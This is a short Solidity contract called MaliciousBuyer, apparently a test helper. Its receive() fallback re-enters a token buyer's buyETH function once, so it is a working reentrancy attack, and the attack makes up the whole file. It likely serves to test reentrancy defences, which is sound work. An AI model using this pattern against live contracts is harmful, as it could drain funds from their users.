// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { IERC20 } from 'openzeppelin-contracts/contracts/token/ERC20/IERC20.sol';

interface TokenBuyerLike {
    function buyETH(uint256 tokenAmountWAD) external payable;
}

contract MaliciousBuyer {
    TokenBuyerLike buyer;
    IERC20 token;
    bool calledTwice;

    constructor(address _buyer, IERC20 _token) {
        buyer = TokenBuyerLike(_buyer);
        token = _token;
    }

    function attack(uint256 tokenAmountWAD) public {
        buyer.buyETH(tokenAmountWAD);
    }

    receive() external payable {
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0 && !calledTwice) {
            calledTwice = true;
            attack(balance);
        }
    }
}
